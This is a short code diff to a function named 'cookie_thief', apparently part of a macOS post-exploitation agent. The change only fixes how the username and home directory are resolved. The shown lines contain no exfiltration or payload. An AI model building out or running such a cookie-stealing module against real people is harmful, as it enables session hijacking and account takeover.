@@ -15,10 +15,10 @@ exports.cookie_thief = function(task, command, params){
     }
 
     if(config.hasOwnProperty("username") && typeof config['username'] == 'string') {
-        username = config['username'];  
+        username = config['username'];
     }
     else {
-        username = $.NSUserName();
+        username = $.NSUserName().js;
     }
     homedir = homedir += username + "/";
 
